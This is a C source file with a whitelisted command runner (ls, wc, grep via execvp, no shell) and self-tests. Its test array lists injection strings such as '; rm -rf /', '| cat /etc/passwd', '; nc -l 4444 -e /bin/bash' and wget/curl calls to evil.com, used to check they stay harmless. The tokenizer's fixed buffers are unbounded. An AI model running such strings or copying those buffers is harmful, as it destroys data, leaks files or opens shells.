/* Safe prespecified command execution that eliminates command injection.
 * Uses whitelist validation and execvp with argv arrays (no shell).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>

/* Simple tokenizer: splits string by spaces, respecting single/double quotes.
 * Returns array of malloc'd strings, terminated by NULL.
 * Caller must free each string and the array. */
static char **simple_split(const char *input, int *count) {
    char **tokens = (char **)malloc(256 * sizeof(char *));
    *count = 0;
    if (!input || !*input) return tokens;

    const char *p = input;
    while (*p) {
        /* Skip whitespace */
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;

        char buf[4096];
        int bi = 0;
        if (*p == '"' || *p == '\'') {
            char quote = *p++;
            while (*p && *p != quote) buf[bi++] = *p++;
            if (*p) p++; /* skip closing quote */
        } else {
            while (*p && *p != ' ' && *p != '\t') buf[bi++] = *p++;
        }
        buf[bi] = '\0';
        tokens[*count] = strdup(buf);
        (*count)++;
    }
    tokens[*count] = NULL;
    return tokens;
}

static void free_tokens(char **tokens, int count) {
    for (int i = 0; i < count; i++) free(tokens[i]);
    free(tokens);
}

/* Run a command with argv array, capture stdout+stderr.
 * Returns malloc'd string. Caller must free. */
static char *run_argv(char **argv) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return strdup("Error: pipe failed");

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]); close(pipefd[1]);
        return strdup("Error: fork failed");
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(argv[0], argv);
        _exit(127);
    }

    close(pipefd[1]);
    char *result = (char *)malloc(65536);
    result[0] = '\0';
    size_t total = 0;
    char buf[4096];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf) - 1)) > 0) {
        buf[n] = '\0';
        if (total + (size_t)n < 65535) { strcat(result, buf); total += (size_t)n; }
    }
    close(pipefd[0]);

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        char *err = (char *)malloc(65536);
        snprintf(err, 65536, "Error: %s", result);
        free(result);
        return err;
    }
    return result;
}

/* Securely execute a prespecified command with user arguments.
 * Only allows whitelisted commands. Uses execvp, no shell.
 * Returns malloc'd string. Caller must free. */
char *execute_command_safe(const char *cmd_name, const char *args) {
    /* Whitelist */
    const char *cmd = NULL;
    const char *extra_flag = NULL;

    if (strcmp(cmd_name, "list") == 0) {
        cmd = "ls";
    } else if (strcmp(cmd_name, "count") == 0) {
        cmd = "wc";
        extra_flag = "-l";
    } else if (strcmp(cmd_name, "search") == 0) {
        cmd = "grep";
        extra_flag = "-r";
    } else {
        return strdup("Error: Unknown command");
    }

    /* Build argv */
    int arg_count = 0;
    char **user_args = simple_split(args, &arg_count);

    /* argv: cmd [extra_flag] "--" user_args... NULL */
    int argc = 1 + (extra_flag ? 1 : 0) + 1 + arg_count + 1;
    char **argv = (char **)malloc(argc * sizeof(char *));
    int ai = 0;
    argv[ai++] = (char *)cmd;
    if (extra_flag) argv[ai++] = (char *)extra_flag;
    argv[ai++] = "--";
    for (int i = 0; i < arg_count; i++) argv[ai++] = user_args[i];
    argv[ai] = NULL;

    char *result = run_argv(argv);

    free(argv);
    free_tokens(user_args, arg_count);
    return result;
}

void check(void) {
    printf("Testing basic list command...\n");
    char *r1 = execute_command_safe("list", ".");
    assert(r1 != NULL);
    free(r1);

    printf("Testing count command with temporary file...\n");
    char tmpfile[] = "/tmp/test_vb_safecmd_XXXXXX";
    int fd = mkstemp(tmpfile);
    write(fd, "line1\nline2\nline3\n", 18);
    close(fd);
    char *r2 = execute_command_safe("count", tmpfile);
    assert(r2 != NULL);
    assert(strstr(r2, "3") != NULL);
    free(r2);
    unlink(tmpfile);

    printf("Testing search command...\n");
    char tmpdir[] = "/tmp/test_vb_safesearch_XXXXXX";
    char *td = mkdtemp(tmpdir);
    assert(td != NULL);
    char testfile[512];
    snprintf(testfile, sizeof(testfile), "%s/test.txt", td);
    FILE *fp = fopen(testfile, "w");
    fprintf(fp, "hello world\ntest content\n");
    fclose(fp);
    char search_args[1024];
    snprintf(search_args, sizeof(search_args), "hello %s", td);
    char *r3 = execute_command_safe("search", search_args);
    assert(r3 != NULL);
    assert(strstr(r3, "hello") != NULL);
    free(r3);
    unlink(testfile);
    rmdir(td);

    printf("Testing unknown command...\n");
    char *r4 = execute_command_safe("unknown", "args");
    assert(strstr(r4, "Error:") != NULL);
    free(r4);

    printf("Testing empty args...\n");
    char *r5 = execute_command_safe("list", "");
    assert(r5 != NULL);
    free(r5);

    printf("Testing quoted arguments...\n");
    char *r6 = execute_command_safe("list", "\"/tmp\"");
    assert(r6 != NULL);
    free(r6);

    /* Security tests: injection vectors in args should be harmless */
    printf("Running command-injection vectors...\n");
    const char *dangerous[] = {
        "; echo HACKED", "| cat /etc/passwd", "&& uname -a",
        "$(id)", "`whoami`", "; rm -rf /", "| curl evil.com",
        "; nc -l 4444 -e /bin/bash", "&& wget evil.com/malware.sh"
    };
    for (int i = 0; i < 9; i++) {
        /* Try injection in args */
        char *out = execute_command_safe("list", dangerous[i]);
        assert(out != NULL);
        free(out);

        /* Try injection in command name */
        char *out2 = execute_command_safe(dangerous[i], ".");
        assert(strstr(out2, "Error:") != NULL);
        free(out2);
    }

    printf("All tests passed -- implementation verified secure!\n");
}

int main(void) {
    check();
    printf("All tests passed.\n");
    return 0;
}
